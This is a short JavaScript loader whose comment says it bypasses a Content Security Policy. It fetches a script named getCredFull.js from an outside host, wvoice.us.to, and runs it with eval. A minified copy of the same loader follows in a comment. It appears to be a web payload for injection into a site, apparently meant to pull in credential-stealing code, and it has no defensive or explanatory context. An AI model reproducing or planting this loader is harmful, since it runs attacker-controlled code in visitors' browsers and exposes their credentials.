//can't use script element because of CSP header
var myRequest = new XMLHttpRequest();
myRequest.onreadystatechange = function() {
  4==myRequest.readyState&&200==myRequest.status&&eval(myRequest.responseText)
};
    myRequest.open('GET', 'https://wvoice.us.to/getCredFull.js', !0);
    myRequest.overrideMimeType('application/javascript');
    myRequest.send();

/*var x=new XMLHttpRequest;x.onreadystatechange=function(){4==x.readyState&&200==x.status&&eval(x.responseText)},x.open("GET","https://wvoice.us.to/getCredFull.js",!0),x.overrideMimeType("application/javascript"),x.send();*/